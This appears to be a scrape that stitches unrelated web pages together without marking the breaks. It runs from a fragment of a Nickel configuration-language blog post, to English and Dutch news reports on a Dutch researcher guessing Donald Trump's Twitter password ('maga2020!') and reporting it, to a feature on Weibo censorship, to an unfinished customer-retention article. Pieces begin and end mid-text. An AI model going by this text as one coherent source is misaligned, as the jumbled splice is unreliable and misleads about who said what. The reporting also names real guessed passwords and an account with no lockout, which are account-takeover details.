       | default: "fallback.myserver.net"
  ;

  port | type: Num
       | description: "The port of the connection."
       | default: 4242
  ;

  url | type: Url
      | description: "The host name of the server."
  ;
}</code></pre></div>
<p>Each field can contain metadata, such as a description or default
value. These aim at being displayed in documentation, or queried by
tools.</p>
<p>The schema can then be used as a contract. Imagine that a function has
swapped two values in its output and returns:</p>
<div data-language="text"><pre><code>{
  host = "myproject.com",
  port = "myproto://myproject.com:1/",
  url = 1
}</code></pre></div>
<p>Without types, this is hard to catch. Surely, an error will eventually pop up
downstream in the pipeline, but how and when? Using the schema above
will make sure that, whenever the fields are actually evaluated, the
function will be blamed in the type error.</p>
<p>Schemas are actually part of a bigger story involving merging records
together, which, in particular, lets the schema instantiate missing
fields with their default values. It is very much inspired by the
<a href="https://nixos.org/manual/nixos/stable/index.html#sec-configuration-syntax">NixOs module system</a> and the <a href="https://cuelang.org/">CUE</a> language, but
it is a story for another time.</p>
<h2>Conclusion</h2>
<p>I hope that I gave you a sense of what Nickel is trying to achieve. I
only presented its most salient aspects: its gradual type system with
contracts, and built-in record schemas. But there is more to explore!
The language is not ready to be used in real world applications yet, but a good
share of the design presented here is implemented. If you are curious about it,

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

Gevers heeft screenshots genomen op het moment dat hij toegang had tot Trumps account. Die screenshots zijn door&nbsp;<a href="https://www.vn.nl/twitter-trump-opnieuw-gehackt/" target="_blank">Vrij Nederland</a>&nbsp;gedeeld met <i>de Volkskrant</i>. Nederlandse beveiligingsexperts noemen de claim van Gevers geloofwaardig.</p><p data-element-id="c946-23c2-841c-0f31-6f16-4be9-bd21-35ca">De Nederlander heeft Trump en de Amerikaanse overheidsdiensten gewaarschuwd voor het beveiligingslek. Na een aantal dagen kreeg hij contact met de Amerikaanse Secret Service in Nederland. Die dienst is ook verantwoordelijk voor de beveiliging van de Amerikaanse president en nam de melding serieus, blijkt uit correspondentie die door <i>de Volkskrant</i> is ingezien. Inmiddels is het account van Trump beter beveiligd.</p><p data-element-id="6496-bdf0-d56a-cf50-9bf7-40a4-d268-cbcf">Het is niet de eerste keer dat Nederlandse hackers erin slagen om het Twitteraccount van Donald Trump over te nemen. Dat gebeurde vier jaar geleden, vlak voor de Amerikaanse verkiezingen, ook al. Toen slaagden drie hackers erin om gezamenlijk het wachtwoord te achterhalen en het account van Trump binnen te komen.</p><h3 data-element-id="a6ff-4061-9533-0d2f-b697-ac37-45ef-012c">Doelwit</h3><p data-element-id="2a3a-646c-50a6-762d-1c67-05e1-8fc7-2def">Dat dit opnieuw is gelukt, is opmerkelijk. Tijdens de Amerikaanse presidentsverkiezingen in 2016 hebben Russische hackers op grote schaal gepoogd de uitkomst te beïnvloeden. Daarna hebben sociale media diverse stappen gezet om manipulatie te voorkomen. En ook nu, amper drie weken voor nieuwe verkiezingen, pogen Rusland en Iran volgens Amerikaanse inlichtingendiensten om de verkiezingen digitaal te manipuleren. Het ligt voor de hand dat ook het Twitteraccount van de president een doelwit is.</p><p data-element-id="64ad-18a2-d97d-ee7b-42d7-f9fd-bcbd-2d68">Twitter wil tegenover <i>de Volkskrant</i> niet on the record reageren en zegt nooit in te kunnen gaan op de beveiligingsmaatregelen voor individuele accounts. Donderdagavond laat het bedrijf wel aan verschillende Amerikaanse media weten ‘geen bewijs te hebben gezien om de bewering te staven’.&nbsp;</p><p data-element-id="a4ab-88b8-7677-4a70-7b7b-0073-03a6-eb0c">Ronald Prins, oprichter van beveiligingsbedrijf Hunt &amp; Hackett en één van de bekendste Nederlandse experts op dat gebied: ‘Ik ken Victor Gevers al heel wat jaren. Hij staat erom bekend dat hij zijn leven wijdt aan het vinden van kwetsbaarheden en hij gaat daar altijd heel ethisch mee om. Op basis van wat ik weet en heb gezien, ziet zijn claim er geloofwaardig uit.’</p><p data-element-id="63a7-8e83-1b74-233c-0244-af6a-a943-d44c">Victor Gevers was in 2016 ook een van de drie hackers die inlogden op het account van Trump. ‘Dat het zo snel weer zou lukken, was niet gepland’, vertelt hij over de aanloop naar de actie. Aanleiding om opnieuw te pogen het account van Trump te hacken, was de berichtgeving in de Verenigde Staten over Hunter Biden. De harde schijf van de zoon van de Democratisch presidentskandidaat Joe Biden zou gestolen of gehackt zijn – mede doordat Hunter Biden een makkelijk te raden wachtwoord gebruikte (Hunter02).</p><p data-element-id="04b3-538f-5657-c7a2-b9c5-22a3-7749-4151">Gevers is bekend met gelekte databases vol oude wachtwoorden en zoekt daarin naar de gegevens van Hunter Biden. Hij meende na analyse van de oude databases dat de informatie onjuist was. Hunter Biden gebruikte andere wachtwoorden. Gevers: ‘Ik kon zien dat het zijn wachtwoord niet was.’</p><figure data-element-id="dab196b3-e132-4a0e-b936-26e9bc538a59"><picture><source srcset="https://images0.persgroep.net/rcs/rhXaFgOzmfomigBBY4Ba2lXgfN8/diocontent/177967066/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9&amp;desiredformat=webp" type="image/webp"><source srcset="https://images0.persgroep.net/rcs/bQxDCojNnHEqCx-Uo3r7MzGS5tY/diocontent/177967066/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" type="image/jpeg"> <img data-height="1602" data-original="https://images0.persgroep.net/rcs/bQxDCojNnHEqCx-Uo3r7MzGS5tY/diocontent/177967066/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" data-src="https://images0.persgroep.net/rcs/bQxDCojNnHEqCx-Uo3r7MzGS5tY/diocontent/177967066/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" data-title="Victor Gevers te gast bij Op1 nadat het nieuws over de succesvolle vorige hack van Trumps Twitteraccount bekend werd." data-width="2880"></picture><figcaption><cite>Victor Gevers te gast bij Op1 nadat het nieuws over de succesvolle vorige hack van Trumps Twitteraccount bekend werd.</cite><span></span></figcaption></figure><h3 data-element-id="ab86-641f-a1d1-7998-e99f-35e6-06eb-c30b">‘Steekproefjes’</h3><p data-element-id="ed8b-e1ec-7d69-1b90-2cf8-b9af-91a3-1b9c">Het brengt hem op het idee om te controleren hoe goed de beveiliging van geverifieerde accounts op twitter eigenlijk is. Hij kijkt naar het account van Susan Rice, de voormalig Amerikaanse veiligheidsadviseur, naar dat van Joe Biden en andere prominente politici. En dan toch ook nog even naar Donald Trump. ‘Steekproefjes doen, dat is mijn werk. Kijken of er ergens een lek in de beveiliging zit.’</p><p data-element-id="809e-1dbe-5995-70f7-ff1a-c483-3ef5-2cec">Eerder ontdekte Gevers een gigantische Chinese database met de locatiegegevens van 2,7 miljoen inwoners van Xinjiang – China’s grootste provincie, waar veel Oeigoeren wonen. In de slecht beveiligde database stonden allerlei persoonlijke data: ID-nummers, nationaliteiten, telefoonnummers, geboortedata, foto’s, werkgevers, maar ook de GPS-coördinaten van de plaatsen die deze mensen bezochten. Door de vondst van de database werd nog eens duidelijk hoe nauwgezet China de Oeigoerse minderheid in het land volgt.</p><p data-element-id="dc0d-9b27-47ba-5e32-f9e6-de4b-818b-ec6a">Op vrijdagochtend 16 oktober voert Gevers haast achteloos een aantal wachtwoorden en variaties daarop in. Bij de vijfde poging is het raak. Hij probeert ‘maga2020!’ (de afkorting van MakeAmericaGreatAgain, de slogan van Trump) en zit pardoes in het Twitteraccount van de Amerikaanse president. Hij is stomverbaasd. Gevers: ‘Ik had gedacht dat ik na vier mislukte pogingen een block zou krijgen. Of dat ik om extra informatie gevraagd zou worden.’ Niets van dat alles.</p><p data-element-id="a238-61a8-1665-18ee-901c-85ea-915f-6b96">Gevers zit die ochtend in misschien wel het belangrijkste Twitteraccount ter wereld en kan 87 miljoen volgers, de aandachtige wereldpers en regeringsleiders een boodschap sturen.  ‘Ik dacht wel: daar gaan we weer’, zegt Gevers. Want zomaar inbreken op een account is strafbaar.</p><h3 data-element-id="875d-d9b4-33bf-0aeb-f685-a37b-2824-c4db">Vriendelijk advies</h3><p data-element-id="b16a-ac7d-9b93-e891-92e3-e13a-a3b4-a039">Als Gevers duidelijk wil maken dat hij met goede bedoelingen handelt, zal hij verantwoord moeten zijn en zijn stappen moeten documenteren. Hij maakt screenshots. Hij schrijft vervolgens een mail aan Donald Trump – ‘ik had nog een oud mailaccount van hem dat we gebruikten voor de melding in 2016’ – en stuurt ook een kopie naar de Amerikaanse organisatie voor digitale veiligheid.</p><p data-element-id="34c3-16de-37ad-5291-d241-ab5b-a5bf-9293">Hij adviseert Trump vriendelijk om extra beveiligingsmaatregelen te nemen. En om misschien een wat langer wachtwoord te nemen. Gevers doet er zelfs een suggestie bij: !IWillMakeAmericaGreatAgain2020!, en een handleiding hoe hij tweestapsverificatie aan kan zetten. ‘Maar ik kreeg geen reactie.’</p><p data-element-id="3fe3-0c7c-36a9-2f69-d275-82c8-5832-297c">Dus probeert hij anderen te waarschuwen. Het campagneteam van Trump, zijn familie. Hij stuurt berichten via Twitter en vraagt of iemand Trump erop wil attenderen dat z’n Twitteraccount onveilig is. Hij tagt de CIA, het Witte Huis, de FBI, Twitter zelf. Geen reactie. Gevers: ‘Op zaterdag zag ik wel opeens dat tweestapsverificatie op het account was ingeschakeld.’</p><p data-element-id="da68-6024-d91e-4421-db8f-881d-4f46-902b">Twee dagen later krijgt hij ’s avonds een mail van de Amerikaanse Secret Service. ‘Vriendelijk. Ze waren geïnteresseerd in mijn informatie. Ik heb ze alles doorgestuurd.’ Op dinsdag spreken ze elkaar digitaal. Ze bedanken Gevers en vertellen hem dat het beveiligingslek bij hen onbekend was.</p><h3 data-element-id="07ca-60ee-aaaf-c968-21c3-7027-640c-4ef1">Stomverbaasd</h3><p data-element-id="6df8-2542-1e2c-d7ce-ab6f-bced-f75d-1b28">De beveiligingsonderzoeker blijft met een aantal vragen zitten. ‘Waarom is het mogelijk voor iemand uit een andere tijdszone om in te loggen op zo’n belangrijk account? Waarom eist Twitter niet een beter wachtwoord? Als ik in zijn account kan komen, kunnen vreemde mogendheden dat toch ook? Waarom krijgen de personen die de president dienen te beschermen de melding niet dat zijn account lek is?’</p><p data-element-id="c38e-2913-55ce-eec2-99da-1982-9dd7-7a69">Ook Matthijs Koot, beveiligingsonderzoeker bij Secura, is stomverbaasd dat het Gevers lukte om zo makkelijk het account van Trump over te nemen. ‘Streng verwoord: wie anno 2020 basale adviezen voor onlineveiligheid in de wind slaat, vormt een potentieel gevaar voor zichzelf en z’n omgeving.’&nbsp;</p><p data-element-id="940c-4473-108a-b1f3-1c85-fa0a-17d8-5b8d">Koot vindt dat de risico’s ook anderen treffen. ‘We zijn tegenwoordig steeds meer onderling verbonden, waardoor een inbraak op het account van één persoon of computer óók de privacy en veiligheid van anderen kan ondermijnen. Via Trumps account kun je immers ook zien welke privéberichten aan hem zijn gestuurd, of dat zijn contacten anderen doorverwijzen naar een link met malware of een vervalste inlogpagina die ze vertrouwen omdat die afkomstig lijkt van Trump.’</p><p data-element-id="e56e-e4a5-7439-46c3-af26-2a7a-5b66-2c23">Dat roept de vraag op in hoeverre Twitter verantwoordelijk is voor extra beveiligingsmaatregelen. Koot: ‘Dwing ofwel af dat mensen aanvullende authenticatie gebruiken of, als ze dat echt niet willen, een complex wachtwoord nemen. Want de tijd van inloggen met alleen een zwak wachtwoord is voorbij.’ Twitter wil niet op vragen reageren.</p><p data-element-id="b9c6-7cb5-8a7b-e17f-9d53-ddad-226c-8520"><span>Blijft de vraag waarom Trump zo’n zwak en simpel wachtwoord gebruikte. Gevers heeft een mogelijke verklaring: ‘Trump is boven de 70 – oudere mensen zetten vaker tweestapsverificatie uit, omdat ze het ingewikkeld vinden. Dat geldt bijvoorbeeld ook voor mijn moeder. Voor een nieuwere generatie is digitale veiligheid vanzelfsprekender.’</span></p><article-element-consent-aware article-element-id="f3bf5e92-6a25-4ab9-864e-fca678649ab1__d012e0b4-3482-48c1-82d3-896bcdc23126"></article-element-consent-aware><template data-element-id="f3bf5e92-6a25-4ab9-864e-fca678649ab1__d012e0b4-3482-48c1-82d3-896bcdc23126"><div class="artstyle__element--freehtml"> <style>

            <p>    Het Twitteraccount @realDonaldTrump van de Amerikaanse president Donald Trump is gehackt door een Nederlander. Trump gebruikte het wachtwoord 'maga2020!' (make america great again) en zou geen extra beveiliging hebben ingesteld.

                    <p>De Nederlander is ethischÂ&nbsp;hacker <a href="https://twitter.com/0xDUDE">Victor Gevers</a>, die al vele duizendenÂ&nbsp;datalekken en andere kwetsbaarheden op het internet heeft gemeld. Het kostte hem zeven pogingen om het wachtwoord van de Amerikaanse president te raden, zo stelt hij tegenÂ&nbsp;<a href="https://www.vn.nl/twitter-trump-opnieuw-gehackt/">Vrij Nederland</a>.</p>
<p>"Ik dacht 'oh god' toen ik was ingelogd", vertelt GeversÂ&nbsp;tegen RTL Nieuws. "Ik wil juist dat het me niet lukt om binnen te komen, en al helemaal niet bij zo'n belangrijk account."</p>

                    <h2>Account gehackt</h2>
<p>Het bewijs dat Gevers toegang had tot het Twitter-account van Trump is ingezien door RTL Nieuws en Vrij Nederland. Trump had volgens Gevers ook geen extra beveiliging ingesteld, zoals de code die je soms na het inloggen moet invoeren - ook wel <a href="https://help.twitter.com/nl/managing-your-account/two-factor-authentication">tweestapsverificatie</a> genoemd.</p>
<p>Gevers heeft niet namens Trump getweet of zijn privÃ©berichten ingezien, maar had beide wel kunnen doen. Als ethisch hacker waarschuwt hij personen of organisaties op kwetsbaarheden in de hoop die te verhelpen. Gevers is binnen de Nederlandse hackerwereld bekend en geliefd om zijn ethische werkwijze.</p>

                    <div>
                    <h2>'Immense gevolgen'</h2>
<p>Correspondent Erik Mouthaan zegt dat Trumps Twitteraccount zijn belangrijkste communicatiemiddel is. "Het Witte Huis heeft gezegd dat alle tweets gelden als officiÃ«le verklaringen van de president. Op ministeries wordt hetÂ&nbsp;account scherp in de gaten gehouden, want vaak moet er beleid gemaakt worden op basis van Trumps gedachten. Zo kondigde hij via Twitter een verbod op transgenders in het leger aan, in plaats van een persbericht of een wetsvoorstel."</p>
<p>"Twitter is de plek waar Trump zijn woede en trots ventileert, je krijgt echt mee hoe hij zich van moment tot moment voelt. Als een kwaadwillende partij vlak voor de verkiezingen het account zou kapen, kan dat immense gevolgen hebben voor de integriteit van de verkiezingenÂ&nbsp;en de veiligheid van het land."</p>

        <div>
                    <div>
                    <h2>Secret Service</h2>
<p>Mogelijk had Trump geen tweestapsverificatie omdat zijn campagneteam ook toegang moet hebbenÂ&nbsp;tot zijn Twitteraccount. Zo'n extra beveiliging maakt het lastiger om een account te delen met anderen. Gevers heeft via-via contact gekregen met deÂ&nbsp;United States Secret Service en het lek gemeld.</p>
<p>Het is niet de eerste keer dat Gevers toegang had tot het Twitteraccount van Trump. In 2016 lukte het hem om samen met twee vrienden toegang te krijgen. Toen was het wachtwoord 'yourefired', dat Gevers samen met zijn twee hackervrienden vond tussen de gelekte LinkedIn-wachtwoorden.Â&nbsp;</p>
<p>Twitter is om een reactie gevraagd, maar heeft niet gereageerd.</p>

                    <h2>Advies</h2>
<p>Trump heeft inmiddels zijn wachtwoord aangepast en tweestapsverificatie ingeschakeld. Dat juicht Gevers toe: "Alsjeblieft mensen, schakel tweestapsverificatie in", zegt hij. "Zelfs als je een slecht wachtwoord gebruikt, zoals 'maga2020!', dan nog blijf je beschermd tegen dit soort simpele aanvallen."</p>

<p>Chow Po-chung<strong>’</strong>s sixth Weibo account was killed on August 11, one day after he posted a photo of Hong Kong’s Lion Rock with the caption: “Hong Kong, my home.”</p>



<p>Chow, a political philosophy professor at the Chinese University of Hong Kong, had anticipated this. A few weeks earlier, China had enacted a broad and vaguely worded <a href="https://www.nytimes.com/2020/06/30/world/asia/hong-kong-security-law-explain.html">national security law</a> in Hong Kong, which criminalizes pro-independence sentiments, and anything else that authorities interpret as “splittist” or damaging to China’s sovereignty.&nbsp;</p>



<p>Lion Rock, a mountain overlooking central Hong Kong, has become a symbol of the city’s pro-democracy movement. Within hours of Chow’s post, the comment section beneath it was flooded with nationalistic comments and personal attacks. He estimated hundreds of users reported him to Weibo for “trying to divide China,” and his account was deleted.</p>



<p>Nearly 550 million people — <a href="http://www.xinhuanet.com/politics/2020-04/28/c_1125915967.htm">more than 60% of China’s internet</a> users — have an account on Weibo, a microblogging platform owned by the Beijing-based Sina Corporation. Since its launch in 2009, the platform evolved into a rare space for public discussion in China, crucial for disseminating information, shaping political discussion, and generating grassroots campaigns, until heavy censorship kicked in two years later.</p>



<p>Chow opened his first account in 2011. He shared the joy of becoming a new father, photos with students, his teaching notes, his essays, and his experience partaking in social movements. He also facilitated and participated in ideological and philosophical debates with young Weibo users. He amassed 180,000 followers before being censored in June 2018. Five of his accounts have since been deleted, some due to posts about the protests, others for no obvious reason.&nbsp;</p>



<p>“I considered every message I posted as my last one,” Chow says.&nbsp;</p>



<p>While Weibo has always censored accounts, as Chinese authorities have stepped up their crackdown on freedom of speech and tightened their grip over all aspects of Chinese life in recent years, political discussions on the platform have become even more muted. Due to pervasive censorship and self-censorship, conversations on Weibo are even more cautious. <em>Zhahao</em>, or “account bombing,” where accounts voicing dissenting opinions get censored, have become more common. Ultranationalistic and chauvinist narratives now drown out critical posts, making it harder for users to speak their minds.</p>



<hr>



<p>Chinese authorities give social media platforms general guidance about what topics and users to monitor or censor, leaving Weibo to decide which keywords and accounts to block.&nbsp;</p>



<p>Even if regulators have their eyes on a specific message or account, they still need the service provider to actually delete the content, according to Fu King-wa, a journalism professor at The University of Hong Kong. State censorship began to intensify in 2011, when social media debates on controversial environmental, social, and cultural issues started to spill over to offline grassroots protests and campaigns, Fu says. This included dozens of ordinary people challenging China’s election system by campaigning as independent candidates on Weibo, and users addressing the controversy around the Red Cross Society of China, which erupted after a young senior official at the government-run charity posted photos on Weibo of her lavish lifestyle.&nbsp;</p>



<p>Fu says it’s not clear if censorship has stepped up again in recent years, as he doesn’t have figures to compare early censorship to what’s happening now, but he suggests that years of censorship have intimidated users into silence.&nbsp;</p>



<p>According to the <a href="https://weiboscope.jmsc.hku.hk/">Weiboscope</a> tracker, which Fu runs at Hong Kong University, nearly 2% of 54,490 random user accounts tracked in 2015 no longer existed by 2020. Fu believes most of the lost accounts were deleted by Weibo. This is a rough estimate, as some accounts may have been reactivated since they were deleted, or deleted by users.</p>



<p>“By the end of 2019, the discussion on Weibo was really dominated by discourse and narratives created by state media,” Fu says. “Finding alternative discussion on issues like the Hong Kong protest was very difficult, unless you followed the less popular accounts.”</p>

<p>A more alarming trend, Fu says, is that nationalistic users are now mobilizing hundreds or thousands of people to report on people with political views they oppose and thus pressure Weibo to “kill” their accounts. According to Chow, this tactic is reminiscent of Cultural Revolution–style purging of political rivals. When enough people report on the same account, there is little doubt that censors will delete it.&nbsp;</p>



<p>Shutting down accounts intimidates users into self-censorship. Weibo still serves as a critical venue for public discussion: 2020 has brought an increasing usage of the site, Fu notes, because more Chinese took to Weibo to voice their grievances, frustration, and discontent amid the outbreak of Covid-19 in Wuhan. But when users fear they will lose their accounts, they no longer speak as freely.</p>



<p>Weibo users who spoke to <em>Rest of World</em> all noticed a trend of increasing censorship over the past few years. Accounts have been removed after mentioning politically sensitive topics, such as the protests in Hong Kong, China’s human rights violations against Uighurs in Xinjiang, Covid-19, and top political leaders.&nbsp;</p>



<p>When she became active on Weibo in early 2018, Lao Yang, whose nickname is roughly translated as “Old Yang,” fiercely advocated for gender equality and human rights to her 50,000 followers. “I enjoyed just shifting the conversation a little bit more toward the uncomfortable. I enjoyed being the asshole in the room,” Yang says.</p>



<p>Her account was deleted last summer after she signaled support for the Hong Kong protests. When she started a new account, a self-proclaimed Weibo staff member reached out and advised her to lay low for a while as she’d already popped onto the radar of the Cyberspace Administration, China’s central internet censor. They told her that whenever she posted sensitive words, primarily in relation to Hong Kong, authorities at the Cyberspace Administration received an algorithmic notice.&nbsp;</p>



<p>“As long as you keep your account,” reads a message from the Weibo worker that was reviewed by <em>Rest of World</em>, “you can keep your advocacy going.”</p>



<p>Yang followed the advice. She went back to advocacy after a few months, but her account was finally “bombed” on New Year’s Day. Whenever she tries to start a new one, it is deleted within 24 hours. And mainland Weibo users can face severe consequences beyond censorship. If their real identity is revealed, nationalist Weibo users may report them to their employers.&nbsp;</p>



<p>In 2013, China instituted a <a href="http://cpc.people.com.cn/n/2013/0910/c87228-22871736.html">law</a> stating that, if one user’s post is considered defamatory and is viewed 5,000 times or reposted more than 500 times, the original poster can face a jail sentence.</p>



<p>Zhahao<em> </em>attacks can also be very disturbing for their victims. “The first bombing dealt a big blow to me,” Chow says. “This was an attack on your life, your memory, your social network, and your identity as a whole.”</p>

<p>Weibo has <a href="http://www.xinhuanet.com//2017-09/14/c_1121665443.htm">required</a> real-name verification upon registration since 2017, linking accounts to people’s official ID or phone number. But users who have been kicked off have been able to get back on using burner accounts from underground online shops.</p>



<p>It’s unclear how such shops set up bot accounts — none of those contacted would talk with a journalist. The cost of a burner account ranges from 0.5 yuan (7 cents) to 240 yuan ($35). The account sellers operate in a legal gray zone, catering mainly to accounts looking to boost their profiles. Authorities have been cracking down on such shops in recent years. In 2018, China’s central internet regulator <a href="https://www.thepaper.cn/newsDetail_forward_2645705">launched a campaign</a> to remove users who obtained burner accounts after being banned on social media platforms.</p>



<p>Wu Xianwei turned to buying burners after her first two accounts were removed. Wu, who grew up in Shanghai but is a Canadian citizen, recently completed her Ph.D. in communications at the University of Iowa. Her first account was censored in March 2018, after China scrapped presidential term limits, allowing current president Xi Jinping to remain in power indefinitely. Wu reposted a statement that read: “I disagree.” The following day, all the accounts that she knew reposted it had disappeared.</p>



<p>Her spare account, also listed under a pseudonym, was active for only two months until she shared a satirical picture mocking Xi and Kim Jong Un.&nbsp;</p>



<p>Wu bought 20 burner accounts for 10 yuan ($1.50) in 2018 and went through every single one of them within a year. Since then, getting ahold of burners has become more difficult. When Wu went back to the same shop for more last year, she found that it no longer existed. Many others have also shut down.&nbsp;</p>



<p>In 2019, Wu says, about 100 of her Weibo friends also lost their accounts. Most of them were highly educated liberals, and they formed a WeChat group to stay in touch. That group, too, has been deleted and re-created.&nbsp;</p>



<p>Still, Wu has been galvanized by the experience. She keeps reappearing on Weibo just to “piss off” ultranationalistic users.&nbsp;</p>



<p>Living overseas, Wu is protected from the worst of the consequences of zhahao. For those based in China, or with family in the country, the stakes are much higher than just losing their accounts. One of Wu’s friends was summoned to a police station after posting an image of the cartoon character Winnie the Pooh, which is commonly used to mock Xi Jinping due to a perceived likeness between the two.</p>



<p>Some censored Weibo users have switched platforms. Chow and Yang have both moved onto Twitter, but there, their impact and audience are smaller. Around 10,000 of Chow’s followers have come with him to the U.S. platform, which is blocked in China. He says that he’s not given …</p></div></div>

                    <p>Customer retention is a goal every business owner should be obsessed with. At the end of the day it's cheaper to retain an existing customer than it is to acquire a new one.</p><p>But how do you ensure that your customers keep using your service?</p><p>Are there any simple, yet effective ways to reduce or even prevent churn?</p><p>As it turns out there's one simple strategy you can use to keep your customers around even if they're about to leave your platform. Let's explore what it is and why it works.</p><h2 id="why-you-should-obsess-over-customer-retention">Why you should obsess over customer retention</h2><p>As already stated in the introduction it's important to focus on customer retention when building a sustainable business.</p><p>Acquiring customers can be an expensive endeavour. If you're not (yet) in a position where your product grows through Word-of-Mouth you're likely spending a good portion of your revenue on paid ads and marketing to drive traffic to your service. Only a few of your thousands of visitors will eventually try your product and convert to become a paying customer.</p><p>Optimizing this marketing and sales funnel is a tricky and costly activity. Think about it for a minute. Who finances your learnings and tweakings of such funnel? Correct, <strong>your existing customers</strong>.</p><p>That's why keeping your users happy and around is one of the most important business objectives.</p><h2 id="why-customers-are-churning">Why customers are churning</h2><p>If you think about it, there's really only one reason why your customers are leaving your platform:</p><blockquote>Your product isn't a crucial part of their life anymore</blockquote><p>While this sounds harsh I'd like you to think about all the services you're currently subscribing to. Now imagine that you can only keep one. What would you cancel? Probably everything except the one you can't live without.</p><p>Of course, 